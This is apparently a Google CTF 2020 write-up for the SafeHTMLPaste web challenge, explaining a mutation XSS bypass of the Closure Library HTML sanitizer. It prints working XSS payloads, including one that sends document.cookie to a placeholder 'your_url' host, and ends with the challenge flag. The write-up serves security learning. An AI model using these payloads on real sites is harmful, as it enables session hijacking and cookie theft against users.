---
title: SafeHTMLPaste - Google CTF 2020
date: 2020-08-26
author: Az3z3l
author_url: https://twitter.com/Az3z3l
categories:
 - Web Exploitation
tags:
 - XSS
 - WYSIWYG
 - Closure Library sanitizer
 - GoogleCTF
---

**tl;dr**

+ Payload:  `a<math>b<xss style=display:block>c<style>d<a title="</style>"><img src onerror=document.location='https://your_url/?'.concat(document.cookie)>">e`

<!--more-->

**No of solves**: 10

**Solved by**: [Az3z3l](https://twitter.com/Az3z3l)

## Challenge Description

Share your html snippets with the world.

https://safehtmlpaste.web.ctfcompetition.com/



## Solution


We are given a text input area where we can enter any data we want without restrictions. We are also provided with an option to view the text we input. On first attempt,  we usually try `<script>alert()</script>` or `<img src=x onerror=alert()>` or the same thing using `svg` to test the existence of XSS. On viewing the notes, we see that all the tags are removed. The next thing I checked was if all the tags were removed or just the ones that might cause XSS. I tried `<b>` and other formatting tags and they were not removed and the resulting text was also formatted. So, we need some kind of payload that bypasses the filter and cause XSS. The text to be dispayled was sanitized by a `static/sanitize-min.js` file. On viewing that, we see that they use Closure Library for sanitizing.  


And this challenge is based on the bug in [Google’s Closure Library sanitizer](https://github.com/google/closure-library/tree/master/closure/goog/html/sanitizer).


What the sanitizer does is that it parses the user input and if it finds any tag/attribute that could be classified as dangerous, it removes those tags. And what we need to do is that create a payload that would seem to be harmless but mutates into a tag that could be used for XSS. This type of vulnerability is caused mostly when users copy and paste arbitrary content into online text editors(like gmail, CKEditor, Froala) that allows text formatting but not other tags. And thus the name `SafeHTMLPaste`. This [research](https://research.securitum.com/the-curious-case-of-copy-paste/) had most vulnerabilities related to this kind of mutation XSS. 


This first thing to do is check if it still had the vulnerability. 
```html
 <math><a style=1>
``` 


This will make the sanitizer throw a `Not an HTMLElement`. The bug is triggered whenever you have an element with style attribute inside `<math>` element.



The next thing would be to trigger XSS. This payload would trigger `alert()` and the next one would `exfiltrate cookies` to your server.  

``` html
<math><xss style=display:block>t<style>X<a title=""</style><img src onerror=alert(1)>">.<a>. 
```

``` html
a<math>b<xss style=display:block>c<style>d<a title="</style>"<img src onerror=document.location='https://your_url/?'.concat(document.cookie)>">e 
```


## WTH is happening?

``` html
<math><xss style=display:block>t<style>X<a title=""</style><img src onerror=alert(1)>">.<a>. 
```

When this is given as the note content, we get an alert when viewing it. On inspecting this content from /view we see this as the source in that place...

```html
<math><xss style="display:block">t<style>X<a title="" <="" style=""></a></style></xss></math><img src="" onerror="alert(1)">"&gt;.<a>.</a>
```

We see that the content we gave and the content we see(from inpect-element) is vastly different. This because of the [mutations](https://security.stackexchange.com/questions/46836/what-is-mutation-xss-mxss) caused by the browser. And due to these mutations, the payload which we enter is changed. This way, we bypass the sanitizer and cause XSS. 


## Update

Although this challenge does not require mutations for xss to be caused. We need to cause an exception in closure library, so that the entire payload we use is returned back. We can do that using style attribute within math tag(this is not allowed and closure library will throw an error).

```html
<math style=""><img src=x onerror=alert()>
```

Thanks to [netcat](https://twitter.com/0xBADCA7) for pointing this out.


## References

https://research.securitum.com/the-curious-case-of-copy-paste/

https://insomnihackdotme.files.wordpress.com/2015/03/copypest.pdf


## Flag

CTF{5c92edcb0bd1cd7d8bf8597f6ace0716}